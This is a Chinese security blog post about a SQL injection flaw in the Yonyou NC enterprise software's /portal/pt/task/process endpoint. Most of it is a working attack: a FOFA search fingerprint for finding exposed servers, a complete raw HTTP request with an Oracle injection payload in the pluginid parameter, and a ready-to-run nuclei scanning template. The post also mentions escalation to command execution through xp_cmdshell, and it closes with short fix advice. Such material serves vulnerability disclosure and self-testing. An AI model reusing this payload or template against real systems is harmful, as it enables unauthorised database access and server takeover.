#  【SQL注入】用友NC process SQL注入漏洞   
原创 1ang  小羊安全屋   2024-11-25 06:49  
  
导言  
  
  
文章仅用作网络安全人员对自己网站、服务器等进行自查检测，不可用于其他用途，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。切勿用于网络攻击！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/reg3T0Fqiax8lPLzcDQicIfv49r4EgibnRuz10rNYiaBDlUaSfqrWgYrD36DPE4uiar4kHLq7x60wPaguey7Pz8BTOA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
PART   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ktKCAuwAa8dmj6TprnPZe7wiasyw7EtyLyNy649qJ3lfwTtxWSKPhdzSJ7JicAxfkYSlAawXNCOmzhS3Rib2ZradA/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/bBPjSTVLnXbhGFgqz3CwuWdGELjD7wYzxM9mrvz9tUBAwaeMof26ca9fSicRezRV3vKt7a04AfuPcLoVBtgpYDw/640?wx_fmt=gif "")  
  
漏洞描述  
  
用友NC /portal/pt/task/process 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/3RSJOISXa6jxhSggXrE9ibwcuRuSia2kIsFAHRbtYf5eb0O4TtXqn4yweC65OpzNRdrrnrkEYbjdqUkg9eIQVkHA/640?wx_fmt=gif "")  
  
漏洞复现  
  
漏洞URL：/portal/pt/task/process  
  
漏洞参数：pluginid  
  
F  O F A：icon_hash="1085941792"  
  
漏洞详情：  
  
1、打开系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lnzwRq0p4icHhia4pKK3z7TIOicqicCibwliaLULNcS1TqibAicAEFQnBz9SibqianzrfZPrhJ9vJiaZUtbjVQbXJSUXE6Dsg/640?wx_fmt=png&from=appmsg "")  
  
2、使用poc进行检测  
```
POST /portal/pt/task/process?pageId=login HTTP/1.1
Host: 127.0.0.1:5001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=A7ED8D2420C0517E62D9552E4831698B.server
Content-Type: application/x-www-form-urlencoded
Content-Length: 279


id=1&oracle=1&pluginid=1{{urlescape(' AND 7194=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7194=7194) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- dJyN)}}
```  
  
2、漏洞利用成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lnzwRq0p4icHhia4pKK3z7TIOicqicCibwliaLt2ASKh7ZWakibSnf7GmXaFhSvn7uTCRq4QywEUqVYZHAycDRHibic5ZdQ/640?wx_fmt=png&from=appmsg "")  
  
nuclei脚本  
```
id: 用友NC processSQL注入

info:
  name: 用友NC processSQL注入
  author: 1ang
  severity: high
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |-
        POST /portal/pt/task/process?pageId=login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: JSESSIONID=A7ED8D2420C0517E62D9552E4831698B.server
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 279


        id=1&oracle=1&pluginid=1{{urlescape(' AND 7194=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7194=7194) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- dJyN)}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - qqbbq1qxxqq
      - type: status
        status:
          - 200
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/bBPjSTVLnXbhGFgqz3CwuWdGELjD7wYzxM9mrvz9tUBAwaeMof26ca9fSicRezRV3vKt7a04AfuPcLoVBtgpYDw/640?wx_fmt=gif "")  
  
修复建议  
  
1、升级到最新版本；  
  
2、关闭系统互联网访问权限，或使用白名单访问。  
   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3YqocLTzbGQjus64G8bmAyDCiaaE8IY57OmvR7bHq1UzAqRG0gme38uvdXggrrlmNJyePh4Ox1AI9oQ1PY8otRw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zQTAicxBBI1QaAzOgiblQicVnO8XZUWj6cpdOL8EHU0unLP9fGEBxdTZDXfHeeEGGibNzMYfxDgtyicKv8r5Q18UsyQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibpQMTribKicf2Xibe2qFYgtMw8UhDdllzZryYjianfS4LcHCAT7VWbjwoaZNF4lCAxUmFdIibmUrBibToxxt9QbGf3WQ/640?wx_fmt=png "")  
  
个人星球，欢迎加入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lnzwRq0p4icF88zkXzrnATODaPrYYSZ1ZUyicl3UZSdda9RxiavwPXEWfdn5WiboAA7HiavEZblfA9CLsFQKlxsU8Xg/640?wx_fmt=jpeg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2TVkuiaNYQGjWwnsmctvTmClxYzHJicxBiahOibtjQicH8vaCz7TPFMK0EsiczbQfwzlSNiaaU8akYibuIdpUCicYoFGZNQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1C21KZjMBaSHgMAvP4faiar3XTekytaNKOlc7UibOhTqxaA0iapiabBKVITYicR4NM125QTp9lYt9lylfI7LzfqkLsg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uNpMBR1pZOia18Kuib6Qukssk36955zGygr0vKFbclQLHMRSJqic5s7waKZlJrto2oTb42sYY7icxo5zcn24MjDSfA/640?wx_fmt=png "")  
  
  
  
  
**——The  End——**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaZREh6DtDyA9wcDsp0m1RNV9C4uiaagltPDn83s3k6Sw5DbfRWdGc25Q1WDNCpjZLXQpCxFfiaGT5ag/640?wx_fmt=gif "")  
  
  
